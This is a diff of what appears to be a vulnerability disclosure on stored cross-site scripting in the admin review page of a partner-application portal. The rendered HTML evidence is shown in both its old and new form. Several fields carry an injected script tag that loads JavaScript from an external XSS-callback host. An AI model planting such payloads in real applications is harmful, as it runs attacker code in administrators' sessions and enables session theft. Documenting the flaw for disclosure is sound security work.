@@ -28,84 +28,8 @@ When an administrative user or reviewer inspects submitted partner applications 
 ### Vulnerable DOM Snippet
 
 ```html
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>PH-63F0B228 · PartnerHub</title>
-    <link rel="stylesheet" href="../assets/style.css">
-  </head>
-  <body class="admin">
-    <header class="admin-top">
-      <a class="logo" href="../index.php"><span class="logo-mark">P</span>PartnerHub</a>
-      <div>
-        <a href="index.php">← Applications</a>
-        <a href="logout.php">Sign out</a>
-      </div>
-    </header>
-    <main class="case">
-      <div class="admin-heading">
-        <div>
-          <span class="kicker">PH-63F0B228</span>
-          <h1>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></h1>
-          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script> · asd@gmail.com</p>
-        </div>
-        <span class="pill pill-pending">pending</span>
-      </div>
-      <div class="columns">
-        <section class="detail-card">
-          <h3>Company profile</h3>
-          <dl>
-            <dt>Website</dt>
-            <dd>Not provided</dd>
-            <dt>Country</dt>
-            <dd>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></dd>
-            <dt>Size</dt>
-            <dd>1–10</dd>
-            <dt>Partner type</dt>
-            <dd>Agency / consultancy</dd>
-            <dt>Regions</dt>
-            <dd>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></dd>
-          </dl>
-          <hr>
-          <h3>Capabilities</h3>
-          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
-          <h3>Relevant experience</h3>
-          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
-          <h3>Partnership goals</h3>
-          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
-        </section>
-        <aside>
-          <form class="detail-card" method="post" action="update.php">
-            <input type="hidden" name="csrf" value="09e2af441b370a67f6486bd87d1722b805eb18f324b5ce4a3eb0dd29787d8263">
-            <input type="hidden" name="id" value="2">
-            <h3>Review application</h3>
-            <label>Status
-              <select name="status">
-                <option value="pending" selected="">Pending</option>
-                <option value="reviewing">Reviewing</option>
-                <option value="more_info">More Info</option>
-                <option value="approved">Approved</option>
-                <option value="declined">Declined</option>
-              </select>
-            </label>
-            <label>Reviewer note / applicant update
-              <textarea name="admin_note" rows="7"></textarea>
-            </label>
-            <button class="btn primary full">Save decision →</button>
-          </form>
-          <div class="detail-card">
-            <h3>Activity</h3>
-            <div class="event">
-              <b>•</b>
-              <p>Application submitted and queued for review<small>2026-11-09 02:23:06</small></p>
-            </div>
-          </div>
-        </aside>
-      </div>
-    </main>
-  </body>
-</html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PH-63F0B228 · PartnerHub</title><link rel="stylesheet" href="../assets/style.css"></head><body class="admin"><header class="admin-top"><a class="logo" href="../index.php"><span class="logo-mark">P</span>PartnerHub</a><div><a href="index.php">← Applications</a><a href="logout.php">Sign out</a></div></header><main class="case"><div class="admin-heading"><div><span class="kicker">PH-63F0B228</span><h1>'"&gt;<script src="https://xss.report/c/vansh"></script></h1><p>'"&gt;<script src="https://xss.report/c/vansh"></script> · asd@gmail.com</p></div><span class="pill pill-pending">pending</span></div><div class="columns"><section class="detail-card"><h3>Company profile</h3><dl><dt>Website</dt><dd>Not provided</dd><dt>Country</dt><dd>'"&gt;<script src="https://xss.report/c/vansh"></script></dd><dt>Size</dt><dd>1–10</dd><dt>Partner type</dt><dd>Agency / consultancy</dd><dt>Regions</dt><dd>'"&gt;<script src="https://xss.report/c/vansh"></script></dd></dl><hr><h3>Capabilities</h3><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p><h3>Relevant experience</h3><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p><h3>Partnership goals</h3><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p></section><aside><form class="detail-card" method="post" action="update.php"><input type="hidden" name="csrf" value="09e2af441b370a67f6486bd87d1722b805eb18f324b5ce4a3eb0dd29787d8263"><input type="hidden" name="id" value="2"><h3>Review application</h3><label>Status<select name="status"><option value="pending" selected="">Pending</option><option value="reviewing">Reviewing</option><option value="more_info">More Info</option><option value="approved">Approved</option><option value="declined">Declined</option></select></label><label>Reviewer note / applicant update<textarea name="admin_note" rows="7"></textarea></label><button class="btn primary full">Save decision →</button></form><div class="detail-card"><h3>Activity</h3><div class="event"><b>•</b><p>Application submitted and queued for review<small>2026-11-09 02:23:06</small></p></div></div></aside></div></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
+<iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe></body></html>
 ```
 ## Impact
 Execution of arbitrary JavaScript code within the high-privilege session of an administrator or partner reviewer examining submitted applications.
